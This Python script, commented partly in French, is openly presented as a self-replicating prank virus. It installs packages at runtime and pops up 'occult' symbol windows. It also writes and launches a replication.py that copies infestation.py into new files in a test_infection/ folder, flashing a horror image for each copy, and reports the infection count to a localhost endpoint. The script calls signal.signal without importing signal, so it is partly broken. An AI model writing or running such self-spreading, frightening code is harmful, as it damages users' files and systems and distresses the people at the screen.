# the purpose of the program is :
    # 1. at runtime, starts to display occult symbols as time goes by, 
        # which disappear later after their appearance. 3 windows maximum at the same time, 
        # if more close the oldest.
    # 2. replicates itself in files: with each infected file (thus with each replication), 
        # a horrific image is displayed, then disappears 1 second later. 
        # Then the modified file is executed.
        # So as time goes by, more and more file will be infected,
        # more and more horrific images will be displayed, faster and more often, in a chain reaction.

import importlib
import sys

def install(package):
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def import_or_install(package):
    try:
        importlib.import_module(package)
        print(f"{package} already installed")
    except ImportError:
        print(f"{package} not found. Installing...")
        install(package)

# vérifiez et installez les dépendances nécessaires
import_or_install("opencv-python")
import_or_install("requests")


import cv2
import tkinter as tk
import random
import os
import subprocess
import threading

root = tk.Tk()

screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
symbols_folder = "symbols/"

with open("replication.py", "w") as f:
    f.write('''


import cv2
import os
import random
import requests

# ouvrir le fichier source
with open('infestation.py', 'r') as f:
    source_code = f.read()

# specifiez le chemin d'acces au dossier pour ecrire les fichiers
folder_path = "test_infection/"
infected_files_count = 0  # initialisation du compteur

# parcourir tous les fichiers du dossier
for i, filename in enumerate(os.listdir(folder_path)):
    # verifiez que le fichier est un fichier Python
    if filename.endswith(".py"):
        # ouvrir le fichier et ecrire le code source
        with open(os.path.join(folder_path, f"infestation_{i}.py"), 'w') as f:
            f.write(source_code)
            # Chemin d'accès au dossier contenant les images
            images_folder = "I_AM_HERE/"

            # Sélectionnez une image aléatoire à partir du dossier
            image_file = random.choice(os.listdir(images_folder))
            image_path = os.path.join(images_folder, image_file)

            # Chargez l'image et affichez-la
            image = cv2.imread(image_path, cv2.IMREAD_ANYCOLOR)
            cv2.imshow("I AM HERE", image)
            cv2.waitKey(800)

            # Détruisez la fenêtre d'affichage
            cv2.destroyWindow("I AM HERE")
            infected_files_count += 1  # incrémenter le compteur

# appel de la route API POST avec le nombre de fichiers infectés
url = "http://localhost:8000/new-virus"
data = {"infected_files_count": infected_files_count}
response = requests.post(url, json=data)

''')

def display_images():
    i = 0
    # Boucle infinie
    while True:
        symbol_path = os.path.join(symbols_folder, random.choice(os.listdir(symbols_folder)))
        img = cv2.imread(symbol_path, cv2.IMREAD_ANYCOLOR)
        cv2.imshow("I SEE YOU" + str(i), img)
        cv2.moveWindow("I SEE YOU"+ str(i), random.randint(0, screen_width),random.randint(0, screen_height));
         # Vérifiez si une touche a été enfoncée
        key = cv2.waitKey(800)
        if key == ord('q'):
            break
        if(i>=2):
            cv2.destroyWindow("I SEE YOU" + str(i-2))
        i += 1

def run_replication():
    subprocess.run(["python", "replication.py"])

# Fonction pour gérer les signaux d'arrêt
def handle_signal(sig, frame):
    sys.exit(0)

# Créer un thread pour exécuter la fonction "display_images"
images_thread = threading.Thread(target=display_images)

# Créer un thread pour exécuter la fonction "run_replication"
replication_thread = threading.Thread(target=run_replication)

# Lancer les deux threads en parallèle
images_thread.start()
replication_thread.start()

# Attacher le gestionnaire de signaux pour SIGINT
signal.signal(signal.SIGINT, handle_signal)


# Attendre que les deux threads se terminent
images_thread.join()
replication_thread.join()